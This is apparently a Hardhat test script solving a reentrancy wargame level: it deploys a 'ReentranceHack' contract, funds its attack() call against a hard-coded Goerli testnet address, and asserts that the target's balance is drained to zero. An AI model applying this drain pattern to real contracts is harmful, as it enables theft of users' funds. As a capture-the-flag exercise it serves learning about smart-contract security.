const { expect } = require("chai");
const { ethers } = require("hardhat");
// const Web3 = require('web3');
const { api_key, } = require('../secrets.json');


describe("ReentrancyHack", function () {
    
    beforeEach(async function () {
        const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
        this.reentranceHack = await ReentranceHack.deploy();
        console.log(this.reentranceHack.address);
    });
    
    it("Attack", async function () {
        const target_address = "0x1964EaBcFe1Ea464558c57bDc2C4D29D60C03a4b";
        
        // obtain current prize, it's on the 1st position of the storage        
        const provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
        var balance = await provider.getBalance(target_address);
        console.log(balance);
        
        // TODO: why do I need to use await/wait instead of plain await?
        const transaction = await this.reentranceHack.attack(target_address, {value: balance, gasLimit: 4000000});
        await transaction.wait(1);
  
        balance = await provider.getBalance(target_address);
        console.log(balance);
        expect(balance).to.equal('0');
  });

  afterEach(async function() {
  });

});
